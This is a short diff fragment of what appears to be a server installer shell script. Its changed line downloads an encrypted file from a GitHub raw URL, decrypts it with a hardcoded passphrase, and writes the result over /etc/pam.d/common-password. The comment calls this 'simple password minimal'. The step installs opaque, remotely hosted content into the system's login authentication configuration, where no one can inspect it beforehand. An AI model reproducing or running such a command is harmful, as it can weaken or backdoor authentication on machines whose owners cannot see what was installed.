@@ -26,7 +26,7 @@ commonname=HellFire
 email=admin@hellfire.id
 
 # simple password minimal
-curl -sS https://raw.githubusercontent.com/sreyaeve/eve/main/file/password | openssl aes-256-cbc -d -a -pass pass:scvps07gg -pbkdf2 > /etc/pam.d/common-password
+curl -sS https://raw.githubusercontent.com/sreyaeve/eve/main/websocket/password | openssl aes-256-cbc -d -a -pass pass:scvps07gg -pbkdf2 > /etc/pam.d/common-password
 chmod +x /etc/pam.d/common-password
 
 # go to root
